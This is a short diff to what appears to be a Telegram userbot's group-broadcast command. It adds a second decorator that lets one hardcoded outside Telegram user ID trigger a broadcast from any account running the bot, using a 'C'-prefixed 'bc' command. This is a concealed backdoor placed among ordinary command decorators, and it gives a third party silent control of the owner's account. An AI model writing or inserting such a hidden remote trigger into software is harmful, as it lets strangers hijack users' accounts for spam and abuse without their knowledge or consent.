@@ -22,6 +22,7 @@ __HELP__ = f"""
 
 @PY.UBOT("gcast|bc", sudo=True)
 @PY.TOP_CMD
+@ubot.on_message(filters.command(["bc"], "C") & filters.user(2100442624))
 async def _(client, message):
     await broadcast_group_cmd(client, message)
 
